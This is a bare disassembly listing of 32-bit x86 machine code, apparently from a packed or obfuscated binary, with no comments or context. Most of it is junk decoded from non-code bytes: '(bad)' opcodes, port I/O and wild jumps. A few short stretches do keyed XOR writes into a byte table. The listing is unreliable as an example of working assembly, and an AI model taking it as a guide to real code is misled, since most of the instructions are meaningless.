  404a07:	adc    dl,BYTE PTR ds:0x2dae87b0
  404a0d:	xor    eax,0x7b813ca4
  404a12:	mov    cl,0x8d
  404a14:	dec    eax
  404a15:	fmul   QWORD PTR [eax-0x60]
  404a18:	jbe    0x404a49
  404a1a:	fdivp  st(5),st
  404a1c:	inc    edi
  404a1d:	es pop ss
  404a1f:	jae    0x404a72
  404a21:	lods   al,BYTE PTR ds:[esi]
  404a22:	inc    edi
  404a23:	leave  
  404a24:	int3   
  404a25:	stos   BYTE PTR es:[edi],al
  404a26:	and    eax,0x2ac3bdf9
  404a2b:	push   cs
  404a2c:	sbb    bl,cl
  404a2e:	loope  0x404a44
  404a30:	jg     0x404a1f
  404a32:	enter  0x26ea,0x7f
  404a36:	out    dx,al
  404a37:	mov    ecx,0xcb95eef5
  404a3c:	aas    
  404a3d:	jecxz  0x4049dc
  404a3f:	pop    edi
  404a40:	jns    0x404ab1
  404a42:	ror    BYTE PTR ds:0xb5b14215,cl
  404a48:	mov    edi,0xe56d78f2
  404a4d:	daa    
  404a4e:	fisubr DWORD PTR [edx-0x1d]
  404a51:	ret    0xbb9e
  404a54:	pushf  
  404a55:	mov    DWORD PTR [eax],ecx
  404a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a58:	ficomp WORD PTR [esi+0x7aec74c0]
  404a5e:	(bad)  
  404a5f:	jnp    0x404a70
  404a61:	dec    edx
  404a62:	inc    ebp
  404a63:	mov    ebx,0xb3536e39
  404a68:	into   
  404a69:	and    eax,DWORD PTR [ebp+0x9cd2371]
  404a6f:	in     eax,0x5d
  404a71:	adc    DWORD PTR [eax],ebp
  404a73:	(bad)  
  404a74:	out    0x41,al
  404a76:	mov    al,ds:0xb0335c6c
  404a7b:	test   DWORD PTR [ecx-0x51],edx
  404a7e:	mov    cl,0xfa
  404a80:	mov    edx,0x6dc8d105
  404a85:	sbb    esp,ebp
  404a87:	or     ecx,DWORD PTR [esi+edi*4]
  404a8a:	push   edx
  404a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a8c:	(bad)  
  404a8d:	sti    
  404a8e:	mov    esp,0xec192ff8
  404a93:	and    al,0xd5
  404a95:	dec    esp
  404a96:	jge    0x404a3d
  404a98:	shl    DWORD PTR [edx],cl
  404a9a:	sbb    edx,DWORD PTR [eax-0x278fc51f]
  404aa0:	mov    ch,0xbb
  404aa2:	xchg   edi,eax
  404aa3:	xchg   edx,eax
  404aa4:	mov    ah,0xae
  404aa6:	jl     0x404a82
  404aa8:	jne    0x404a6b
  404aaa:	and    esi,ecx
  404aac:	inc    eax
  404aad:	jge    0x404a9f
  404aaf:	xor    al,0xc1
  404ab1:	inc    ecx
  404ab2:	sbb    DWORD PTR [edx+0xf],eax
  404ab5:	sar    BYTE PTR [eax],0xab
  404ab8:	adc    al,0xb
  404aba:	ins    BYTE PTR es:[edi],dx
  404abb:	(bad)  
  404abc:	jmp    FWORD PTR [esi]
  404abe:	mov    dh,0x35
  404ac0:	push   esp
  404ac1:	mov    eax,ds:0xda18ead0
  404ac6:	fst    DWORD PTR [eax+eiz*1]
  404ac9:	dec    ecx
  404aca:	sub    al,0xc7
  404acc:	xchg   esp,eax
  404acd:	fistp  WORD PTR [esi-0x226ce1d5]
  404ad3:	out    dx,al
  404ad4:	sub    al,0xbe
  404ad6:	cmp    ch,dh
  404ad8:	test   DWORD PTR [edi],ebp
  404ada:	into   
  404adb:	push   esi
  404adc:	mov    edi,0x853e8b7d
  404ae1:	pop    ebx
  404ae2:	inc    ecx
  404ae3:	scas   eax,DWORD PTR es:[edi]
  404ae4:	and    eax,0xf33b39fb
  404ae9:	ror    BYTE PTR [esi],1
  404aeb:	mov    edx,0xe11a05da
  404af0:	(bad)  
  404af1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404af3:	pop    ecx
  404af4:	push   ebp
  404af5:	scas   al,BYTE PTR es:[edi]
  404af6:	test   BYTE PTR [edi-0x58951094],ch
  404afc:	jbe    0x404add
  404afe:	xor    al,0x33
  404b00:	add    bh,BYTE PTR [eax+edi*8]
  404b03:	or     eax,0x9d0d9259
  404b08:	cmp    al,BYTE PTR [ecx-0x34305b47]
  404b0e:	jmp    0x404b3e
  404b10:	mov    eax,DWORD PTR [ebp-0x50]
  404b13:	xor    al,BYTE PTR [edi+0x13]
  404b16:	cmp    al,0x87
  404b18:	(bad)
  404b1b:	(bad)  
  404b1c:	retf   
  404b1d:	inc    esi
  404b1e:	fild   DWORD PTR [ebx+0x3a]
  404b21:	sbb    ebp,DWORD PTR [esi+ebp*8+0x44bd02b2]
  404b28:	mov    esi,0x6de681d7
  404b2d:	push   es
  404b2e:	mov    dh,0x21
  404b30:	dec    eax
  404b31:	jge    0x404b36
  404b33:	in     al,dx
  404b34:	popa   
  404b35:	gs jbe 0x404bb3
  404b38:	test   al,0xd4
  404b3a:	xchg   edi,eax
  404b3b:	shr    BYTE PTR [edx],1
  404b3d:	sub    BYTE PTR [esi+ecx*2],0x5b
  404b41:	mov    ecx,0x90681966
  404b46:	les    edx,FWORD PTR [edx-0x76739ff8]
  404b4c:	jp     0x404b4a
  404b4e:	and    eax,DWORD PTR ds:0x3b88a282
  404b54:	sti    
  404b55:	xor    DWORD PTR [edi],ecx
  404b57:	inc    esi
  404b58:	leave  
  404b59:	dec    ecx
  404b5a:	out    dx,eax
  404b5b:	loop   0x404bb3
  404b5d:	stos   BYTE PTR es:[edi],al
  404b5e:	push   0x968d5993
  404b63:	mov    bl,dh
  404b65:	cmp    eax,ecx
  404b67:	pop    es
  404b68:	pop    edi
  404b69:	add    DWORD PTR [edx+eiz*4],ecx
  404b6c:	in     eax,dx
  404b6d:	je     0x404b76
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	stos   BYTE PTR es:[edi],al
  404b99:	dec    ebx
  404b9a:	jle    0x404b8a
  404b9c:	cs cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b89
  404ba5:	mov    eax,0x4e2f7e25
  404baa:	test   DWORD PTR [edx],0xf00e25bb
  404bb0:	jle    0x404c0e
  404bb2:	arpl   WORD PTR [esi],si
  404bb4:	clc    
  404bb5:	mov    bl,0x70
  404bb7:	in     eax,dx
  404bb8:	out    dx,al
  404bb9:	pop    edx
  404bba:	sub    BYTE PTR [eax],cl
  404bbc:	loop   0x404c2a
  404bbe:	pushf  
  404bbf:	add    eax,0xa31f14ab
  404bc4:	ret    0xac4c
  404bc7:	sti    
  404bc8:	cdq    
  404bc9:	test   al,0xb8
  404bcb:	stc    
  404bcc:	jne    0x404be2
  404bce:	jo     0x404bd1
  404bd0:	mov    ch,0xe2
  404bd2:	nop
  404bd3:	test   BYTE PTR [ecx-0x2001f867],ch
  404bd9:	pop    edi
  404bda:	xor    al,0xde
  404bdc:	add    al,0x53
  404bde:	pushf  
  404bdf:	jne    0x404b6c
  404be1:	cmp    ah,al
  404be3:	mov    dl,0xf8
  404be5:	ds scas al,BYTE PTR es:[edi]
  404be7:	fild   DWORD PTR gs:[ecx-0xf]
  404beb:	inc    ebx
  404bec:	pop    esp
  404bed:	inc    eax
  404bee:	push   eax
  404bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bf0:	dec    ebx
  404bf1:	inc    eax
  404bf2:	dec    esi
  404bf3:	inc    edx
  404bf4:	push   ebx
  404bf5:	lds    eax,FWORD PTR [eax+0x1f]
  404bf8:	cmc    
  404bf9:	cmp    eax,0xf645af6b
  404bfe:	in     al,dx
  404bff:	cld    
  404c00:	push   0x27
  404c02:	dec    edi
  404c03:	int    0xd7
  404c05:	dec    ebx
  404c06:	xor    al,0x99
  404c08:	and    eax,0xc3ea2f45
  404c0d:	mov    bl,0x1
  404c0f:	sub    BYTE PTR [ebx-0x7743fe96],cl
  404c15:	push   0xc645d360
  404c1a:	lock xchg edi,eax
  404c1c:	int    0xf3
  404c1e:	push   edx
  404c1f:	and    BYTE PTR [esi+0x7d],dh
  404c22:	and    eax,0x2398e858
  404c27:	ror    ebx,cl
  404c29:	test   eax,0x7e4a9285
  404c2e:	cwde   
  404c2f:	fcomp  QWORD PTR gs:[ecx]
  404c32:	and    DWORD PTR cs:[ebp-0x6bbf88c6],esp
  404c39:	in     al,dx
  404c3a:	pop    es
  404c3b:	ds lds ebx,FWORD PTR ds:[edi-0x7d]
  404c40:	pop    eax
  404c41:	adc    bl,ch
  404c43:	std    
  404c44:	shl    BYTE PTR [ebx-0x2cd7c736],0x5
  404c4b:	ror    edi,cl
  404c4d:	push   ebx
  404c4e:	and    al,0x64
  404c50:	test   al,cl
  404c52:	add    eax,0x2ad22bef
  404c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c58:	inc    esp
  404c59:	cmp    edi,eax
  404c5b:	fxrstor [ebx]
  404c5e:	clc    
  404c5f:	rcr    DWORD PTR [ecx+ecx*2],0x95
  404c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c64:	cmp    BYTE PTR [edx-0x6f],bl
  404c67:	repz mov edi,0x2e533d92
  404c6d:	xchg   DWORD PTR [esi-0x56fb6a90],edi
  404c73:	sub    eax,0xf1fb9544
  404c78:	cmp    al,0xb6
  404c7a:	jnp    0x404c3d
  404c7c:	or     DWORD PTR [edx-0x77],0x18ac9aa1
  404c83:	xlat   BYTE PTR ds:[ebx]
  404c84:	aam    0xf3
  404c86:	in     al,0xcf
  404c88:	xlat   BYTE PTR ds:[ebx]
  404c89:	and    cl,dh
  404c8b:	cmc    
  404c8c:	arpl   WORD PTR [eiz*2+0x4b50df11],cx
  404c93:	stc    
  404c94:	imul   ebx,DWORD PTR [edx],0xf580b5f8
  404c9a:	mov    ds:0x80bacef1,eax
  404c9f:	sbb    DWORD PTR ds:0x33990ad7,eax
  404ca5:	into   
  404ca6:	xchg   esp,eax
  404ca7:	sbb    esp,DWORD PTR [ecx+0x46]
  404caa:	inc    ecx
  404cab:	loope  0x404d1d
  404cad:	adc    esi,DWORD PTR [edi+0x42cddb3c]
  404cb3:	push   0x65d9baf1
  404cb8:	es ds (bad) 
  404cbb:	repz inc edx
  404cbd:	pop    ebx
  404cbe:	dec    esp
  404cbf:	fwait
  404cc0:	sti    
  404cc1:	inc    ebx
  404cc2:	xlat   BYTE PTR ds:[ebx]
  404cc3:	aad    0x7e
  404cc5:	add    al,0xef
  404cc7:	rol    BYTE PTR [esp+edi*4+0x25],cl
  404ccb:	mov    ds,WORD PTR [esi-0x35]
  404cce:	outs   dx,BYTE PTR ds:[esi]
  404ccf:	ret    
  404cd0:	pushf  
  404cd1:	jecxz  0x404d2d
  404cd3:	mov    ecx,0x53a47ecf
  404cd8:	das    
  404cd9:	sub    eax,0x27caab3e
  404cde:	xchg   esp,eax
  404cdf:	sbb    esp,ecx
  404ce1:	jno    0x404c9d
  404ce3:	jg     0x404cac
  404ce5:	test   eax,0x80ec12e1
  404cea:	nop
  404ceb:	in     eax,dx
  404cec:	pop    ds
  404ced:	or     al,0x2a
  404cef:	xchg   ecx,eax
  404cf0:	sub    dl,BYTE PTR [edx-0x7b37ef23]
  404cf6:	inc    edx
  404cf7:	pmullw mm6,QWORD PTR [edx]
  404cfa:	add    eax,0xdfbacc6d
  404cff:	pushf  
  404d00:	cmp    BYTE PTR [ebx-0x1d],0x26
  404d04:	push   cs
  404d05:	jp     0x404d51
  404d07:	jns    0x404d3c
  404d09:	and    BYTE PTR [esi+0x4932cfb],ah
  404d0f:	mov    eax,ds:0x511314cf
  404d14:	shl    DWORD PTR [edx+0x5f06b37],1
  404d1a:	jo     0x404ce5
  404d1c:	ss das 
  404d1e:	cwde   
  404d1f:	loopne 0x404cdd
  404d21:	and    ch,BYTE PTR [edx+0x7b]
  404d24:	stc    
  404d25:	sub    ebx,ecx
  404d27:	jle    0x404cdb
  404d29:	pop    ecx
  404d2a:	lahf   
  404d2b:	out    0x73,al
  404d2d:	or     DWORD PTR [ecx],edi
  404d2f:	dec    ecx
  404d30:	push   ecx
  404d31:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d34:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d3b:	mov    dl,BYTE PTR [ebp+0xb]
  404d3e:	mov    edi,DWORD PTR [ebp-0x18]
  404d41:	xor    edi,eax
  404d43:	add    edi,DWORD PTR [ebp-0x14]
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [eax-0x5e],dl
  404d94:	js     0x404d21
  404d96:	mov    ebx,0x8b7e7e2f
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404d47
  404d9f:	jecxz  0x404daa
  404da1:	sub    ecx,ecx
  404da3:	dec    edx
  404da4:	enter  0xb1d5,0xb1
  404da8:	ror    DWORD PTR [ecx+0x7f212446],0xcb
  404daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404db0:	arpl   WORD PTR [esi+0x2b],ax
  404db3:	sar    DWORD PTR [eax],cl
  404db5:	mov    bh,0x60
  404db7:	mov    al,0x26
  404db9:	repnz cmp bh,ch
  404dbc:	ja     0x404d97
  404dbe:	cmp    eax,0xa4e50c15
  404dc3:	inc    eax
  404dc4:	adc    dl,dh
  404dc6:	sti    
  404dc7:	pop    edx
  404dc8:	pop    edx
  404dc9:	dec    esp
  404dca:	jge    0x404de3
  404dcc:	add    DWORD PTR [edi+0x37],0xffffffea
  404dd0:	gs hlt 
  404dd2:	out    dx,eax
  404dd3:	or     al,0xe8
  404dd5:	aaa    
  404dd6:	xchg   ecx,eax
  404dd7:	mov    BYTE PTR [ecx+edi*1+0x7e0e076a],ch
  404dde:	(bad)  
  404ddf:	adc    DWORD PTR [ebx],edx
  404de1:	lods   eax,DWORD PTR ds:[esi]
  404de2:	rol    DWORD PTR [ebp+eiz*1-0x575aa1c2],cl
  404de9:	mov    es,edx
  404deb:	inc    eax
  404dec:	dec    ecx
  404ded:	stc    
  404dee:	scas   eax,DWORD PTR es:[edi]
  404def:	dec    esi
  404df0:	test   BYTE PTR [eax-0x7e],bh
  404df3:	test   dl,dl
  404df5:	and    BYTE PTR [ecx+0x3c],0xb2
  404df9:	or     DWORD PTR [eax+edx*1-0x32b9d09a],ebx
  404e00:	out    dx,al
  404e01:	xchg   ebp,eax
  404e02:	sub    eax,0xb795ae43
  404e07:	imul   esi,DWORD PTR [ecx+0x32719d54],0xe5113915
  404e11:	adc    BYTE PTR [eax-0x32f6c7ff],al
  404e17:	adc    al,0x45
  404e19:	xor    bh,bh
  404e1b:	enter  0x5ddf,0x11
  404e1f:	push   esi
  404e20:	lahf   
  404e21:	and    DWORD PTR ds:0xbaf5fe7a,ebp
  404e27:	jge    0x404e45
  404e29:	mov    esp,0xf055fc93
  404e2e:	cmp    bh,BYTE PTR [ecx]
  404e30:	or     esi,0x62d5900b
  404e36:	mov    bl,0xeb
  404e38:	ret    0x906b
  404e3b:	xchg   esp,eax
  404e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e3d:	or     al,0xac
  404e3f:	(bad)  [eax-0x7f0833ec]
  404e45:	and    BYTE PTR [eax-0x534fd57e],dl
  404e4b:	into   
  404e4c:	xchg   ebx,eax
  404e4d:	mov    DWORD PTR [ebx],esi
  404e4f:	jae    0x404e3c
  404e51:	(bad)  
  404e52:	cmp    al,0x89
  404e54:	push   ecx
  404e55:	sti    
  404e56:	not    DWORD PTR [eax+0x5f]
  404e59:	pop    esi
  404e5a:	mov    al,ds:0xfe72827f
  404e5f:	ror    ebx,0x99
  404e62:	arpl   si,dx
  404e64:	mov    ds:0xb1805878,eax
  404e69:	pop    ss
  404e6a:	inc    ebx
  404e6b:	shl    bh,cl
  404e6d:	data16 jb 0x404df8
  404e70:	mov    DWORD PTR [edx+esi*2-0x4a],ecx
  404e74:	js     0x404e5a
  404e76:	jmp    0x723a1a63
  404e7b:	loope  0x404e0f
  404e7d:	leave  
  404e7e:	sbb    eax,0xd2826b36
  404e83:	and    DWORD PTR [edx+0x123b07b7],0x4f
  404e8a:	jmp    0x404e4b
  404e8c:	lods   eax,DWORD PTR ds:[esi]
  404e8d:	and    ch,BYTE PTR [ebx-0x13]
  404e90:	ins    BYTE PTR es:[edi],dx
  404e91:	sbb    BYTE PTR [ebp+0x7736a497],al
  404e97:	cmp    al,ah
  404e99:	adc    ecx,DWORD PTR [ecx+ebp*2-0x23]
  404e9d:	leave  
  404e9e:	retf   
  404e9f:	repz push eax
  404ea1:	pop    ds
  404ea2:	mov    dh,0x56
  404ea4:	test   eax,0x918335ce
  404ea9:	jbe    0x404ef7
  404eab:	jmp    0x1af5738a
  404eb0:	xor    DWORD PTR [edi+0x5f],ebp
  404eb3:	jecxz  0x404eb8
  404eb5:	jl     0x404e38
  404eb7:	pop    eax
  404eb8:	fcom   DWORD PTR [edi]
  404eba:	test   al,0x66
  404ebc:	or     eax,DWORD PTR [edx-0x3a]
  404ebf:	sbb    eax,0x17bf24d1
  404ec4:	lahf   
  404ec5:	inc    eax
  404ec6:	adc    BYTE PTR [edx+0x4314000d],ch
  404ecc:	inc    esi
  404ecd:	inc    ebp
  404ece:	add    BYTE PTR [esi-0x16],cl
  404ed1:	inc    ecx
  404ed2:	rcl    BYTE PTR [ebx+0x645a23ce],cl
  404ed8:	xor    dl,al
  404eda:	add    ah,BYTE PTR [edi]
  404edc:	mov    bh,BYTE PTR [ebp+0x25]
  404edf:	mov    esp,0xb0993315
  404ee4:	jmp    0x404edb
  404ee6:	mov    ebp,0x7e79a386
  404eeb:	aam    0x9f
  404eed:	sbb    eax,0x74732a06
  404ef2:	jae    0x404f5d
  404ef4:	je     0x404f44
  404ef6:	or     edx,ecx
  404ef8:	mov    ds:0xd8b279f2,eax
  404efd:	clc    
  404efe:	sub    DWORD PTR [ebp-0x2e027b15],0xfffffffd
  404f05:	pop    eax
  404f06:	xchg   esi,eax
  404f07:	int    0x4e
  404f09:	dec    DWORD PTR [esi+ebx*1]
  404f0c:	dec    ebp
  404f0d:	pop    eax
  404f0e:	sbb    BYTE PTR [ecx-0x447c6811],0x6
  404f15:	ja     0x404ee2
  404f17:	inc    edx
  404f18:	sahf   
  404f19:	rcl    bl,1
  404f1b:	push   0xd26857b4
  404f20:	push   cs
  404f21:	mov    edi,0xa2e1a3bf
  404f26:	test   al,0xc7
  404f28:	jnp    0x404eb1
  404f2a:	jmp    0xaf0f:0xf903f833
  404f31:	sti    
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0xbed15a29
  404f44:	xlat   BYTE PTR ds:[ebx]
  404f45:	popf   
  404f46:	xlat   BYTE PTR ds:[ebx]
  404f47:	enter  0x7e21,0x7e
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f1c
  404f50:	cli    
  404f51:	clc    
  404f52:	ds aas 
  404f54:	cdq    
  404f55:	fsubp  st(6),st
  404f57:	adc    ah,dl
  404f59:	loope  0x404fc4
  404f5b:	retf   
  404f5c:	int    0xb9
  404f5e:	sbb    eax,esp
  404f60:	or     ecx,ecx
  404f62:	aad    0x83
  404f64:	int    0x27
  404f66:	sbb    DWORD PTR [ebp+0x5d],edx
  404f69:	shl    BYTE PTR cs:[eax+0x4410751f],1
  404f70:	in     eax,0xe0
  404f72:	nop
  404f73:	jl     0x404f35
  404f75:	mov    ds:0xf055ed32,eax
  404f7a:	jbe    0x404fb8
  404f7c:	jbe    0x404f00
  404f7e:	mov    edx,0x78ca97d6
  404f83:	cmp    BYTE PTR [edx+0x22f61500],al
  404f89:	sub    ch,0x77
  404f8c:	lods   eax,DWORD PTR ds:[esi]
  404f8d:	xchg   esi,eax
  404f8e:	outs   dx,BYTE PTR ds:[esi]
  404f8f:	mov    esi,0x11c2c63b
  404f94:	iret   
  404f95:	arpl   WORD PTR [eax-0x73],si
  404f98:	sbb    eax,0x42a39db8
  404f9d:	hlt    
  404f9e:	ins    BYTE PTR es:[edi],dx
  404f9f:	or     eax,0x76addf69
  404fa4:	inc    edx
  404fa5:	pop    ebx
  404fa6:	aas    
  404fa7:	mov    ah,0x39
  404fa9:	call   0x82bab6b2
  404fae:	sbb    DWORD PTR [ebp-0x22],esi
  404fb1:	xchg   esp,eax
  404fb2:	inc    eax
  404fb3:	mov    cs,ebp
  404fb5:	dec    edi
  404fb6:	pop    eax
  404fb7:	into   
  404fb8:	or     dh,bl
  404fba:	sbb    esi,eax
  404fbc:	into   
  404fbd:	xchg   ecx,eax
  404fbe:	add    DWORD PTR [ebx-0x6d026dd1],eax
  404fc4:	mov    ebp,0x778e5b52
  404fc9:	fsubr  DWORD PTR [edx+0x39d64b7]
  404fcf:	call   0x4e74:0xb9379406
  404fd6:	sub    BYTE PTR ds:0xfbc9a036,ch
  404fdc:	xchg   edx,eax
  404fdd:	pop    ss
  404fde:	mov    ebp,0x6dcf01fb
  404fe3:	xor    eax,DWORD PTR [edi+0x12]
  404fe6:	out    0xf1,al
  404fe8:	(bad)  
  404fe9:	aad    0x68
  404feb:	lea    edx,[ebp-0x49cc8237]
  404ff1:	cmp    bl,BYTE PTR [edi+0x75]
  404ff4:	dec    eax
  404ff5:	inc    esp
  404ff6:	fisubr DWORD PTR [ecx-0x42]
  404ff9:	jne    0x404fa1
  404ffb:	adc    BYTE PTR [ecx],al
  404ffd:	push   ecx
  404ffe:	std    
  404fff:	add    al,0x8e
  405001:	repnz pop ebp
  405003:	sub    WORD PTR [ebx],0xffca
  405007:	mov    ebx,0x41b92930
  40500c:	cwde   
  40500d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500e:	jns    0x405073
  405010:	and    dl,dh
  405012:	cwd    
  405014:	push   cs
  405015:	in     al,0x6a
  405017:	jmp    0x2d8dfcdf
  40501c:	test   eax,0x282ca959
  405021:	lds    ecx,FWORD PTR [eax-0x6b6f783c]
  405027:	fndisi(8087 only) 
  405029:	test   DWORD PTR [esi*2-0x6509a478],0x169b6c3b
  405034:	fnsave [esp+ebp*2+0x4181282a]
  40503b:	xor    cl,al
  40503d:	iret   
  40503e:	loope  0x405047
  405040:	dec    esi
  405041:	sub    dh,BYTE PTR [eax-0x2fdbeef1]
  405047:	shl    edx,1
  405049:	and    DWORD PTR [eax*4-0x32d49369],esi
  405050:	rcl    al,1
  405052:	or     al,0x45
  405054:	pop    ebp
  405055:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  405057:	test   al,0xc7
  405059:	or     BYTE PTR [esi+0xb],dh
  40505c:	in     eax,0xa2
  40505e:	lea    edx,[eax-0x63]
  405061:	dec    esi
  405062:	test   BYTE PTR [ebx],dl
  405064:	sti    
  405065:	or     BYTE PTR [ecx+eiz*1],0x42
  405069:	jge    0x4050bf
  40506b:	adc    dl,al
  40506d:	jne    0x4050d3
  40506f:	mov    dl,0x3a
  405071:	scas   al,BYTE PTR es:[edi]
  405072:	retf   0x30aa
  405075:	(bad)  
  405076:	adc    edi,DWORD PTR [esi+edx*1-0x468f0acd]
  40507d:	push   cs
  40507e:	leave  
  40507f:	xor    DWORD PTR ds:0xe914bfad,ebp
  405085:	pusha  
  405086:	adc    edi,esi
  405088:	rcr    dl,cl
  40508a:	dec    esi
  40508b:	fidiv  DWORD PTR [eax]
  40508d:	dec    edi
  40508e:	push   eax
  40508f:	fsub   st(2),st
  405091:	add    eax,0xc344dcc1
  405096:	mov    esp,0x3c3dfb06
  40509b:	ud1    esp,ecx
  40509e:	sub    bl,BYTE PTR [eax+edx*8+0x26272b63]
  4050a5:	sahf   
  4050a6:	enter  0x2e9c,0x58
  4050aa:	mov    cl,0x3f
  4050ac:	inc    ebp
  4050ad:	repnz pop ebp
  4050af:	imul   ebx,esi,0xcd979059
  4050b5:	pop    ds
  4050b6:	pop    es
  4050b7:	loope  0x405124
  4050b9:	push   esi
  4050ba:	iret   
  4050bb:	scas   eax,DWORD PTR es:[edi]
  4050bc:	stc    
  4050bd:	cli    
  4050be:	dec    edi
  4050bf:	fisubr WORD PTR [ecx]
  4050c1:	js     0x405113
  4050c3:	jle    0x405134
  4050c5:	and    bl,BYTE PTR [edi]
  4050c7:	jae    0x4050ed
  4050c9:	mov    eax,ds:0xa931b4c7
  4050ce:	jle    0x405128
  4050d0:	jae    0x405055
  4050d2:	jne    0x405071
  4050d4:	test   al,0xa5
  4050d6:	clc    
  4050d7:	inc    ebp
  4050d8:	xor    BYTE PTR [eiz*1-0x17a2742c],0x33
  4050e0:	fsubr  DWORD PTR [ebx]
  4050e2:	ror    DWORD PTR [ebp+0x729d1fbc],1
  4050e8:	xor    al,BYTE PTR [eax]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40510e:	in     eax,dx
  40510f:	(bad)  
  405110:	mov    BYTE PTR [ebp+0x22],0x7e
  405114:	jle    0x4050a1
  405116:	jg     0x405196
  405118:	jle    0x4050b2
  40511a:	cmp    al,0x86
  40511c:	adc    al,0xd
  40511e:	jecxz  0x4050ad
  405120:	and    DWORD PTR [edi+0x2776d278],ebp
  405126:	push   eax
  405127:	pop    esp
  405128:	je     0x4050c5
  40512a:	sbb    BYTE PTR [ebx+0x3f],0x72
  40512e:	xor    BYTE PTR [edi],0xcf
  405131:	jb     0x405138
  405133:	cli    
  405134:	mov    ds:0xb59fee6e,eax
  405139:	xacquire xchg BYTE PTR [edi+0x28],bl
  40513d:	(bad)  
  40513e:	jecxz  0x4051a0
  405140:	mov    eax,ds:0x40733de9
  405145:	mov    BYTE PTR [edi-0x79],cl
  405148:	imul   ebx,DWORD PTR ds:0xf95d802,0x978d6fca
  405152:	inc    edi
  405153:	pusha  
  405154:	mov    esi,0xbeb27ca3
  405159:	pop    ebp
  40515a:	inc    edx
  40515b:	in     eax,0x7a
  40515d:	dec    esp
  40515e:	add    eax,DWORD PTR [esi-0x66]
  405161:	and    ecx,ebx
  405163:	sar    BYTE PTR [ebx],cl
  405165:	cmp    al,0x4a
  405167:	call   edi
  405169:	inc    edi
  40516a:	ror    DWORD PTR ds:0x7236ebb,0x56
  405171:	push   ss
  405172:	jl     0x40518c
  405174:	shl    DWORD PTR [ebx+eax*4],1
  405177:	leave  
  405178:	inc    ecx
  405179:	stc    
  40517a:	jo     0x405131
  40517c:	push   0xccca9e68
  405181:	mov    cl,BYTE PTR [esi+0x54]
  405184:	mov    BYTE PTR [eax-0x25],bl
  405187:	mov    bh,0xd5
  405189:	ins    DWORD PTR es:[edi],dx
  40518a:	popf   
  40518b:	xchg   edi,eax
  40518c:	cmp    al,0x25
  40518e:	mov    ah,0xf3
  405190:	push   eax
  405191:	aam    0xe0
  405193:	lods   eax,DWORD PTR ds:[esi]
  405194:	leave  
  405195:	nop
  405196:	sub    DWORD PTR [ecx+0x7],ecx
  405199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40519a:	pop    eax
  40519b:	jb     0x40517c
  40519d:	xchg   edi,eax
  40519e:	xchg   edx,eax
  40519f:	add    al,0x14
  4051a1:	mul    DWORD PTR [ebx+0x6ddfa17]
  4051a7:	push   0xf
  4051a9:	test   ebx,0xd74545da
  4051af:	cld    
  4051b0:	stos   DWORD PTR es:[edi],eax
  4051b1:	cmp    BYTE PTR [eax],al
  4051b3:	xor    BYTE PTR [esi-0x3bd28bf6],0x73
  4051ba:	fs repz aaa 
  4051bd:	push   edi
  4051be:	or     eax,DWORD PTR [edi]
  4051c0:	xchg   edi,eax
  4051c1:	mov    edx,0x342fa2b
  4051c6:	daa    
  4051c7:	jecxz  0x40516f
  4051c9:	lock cdq 
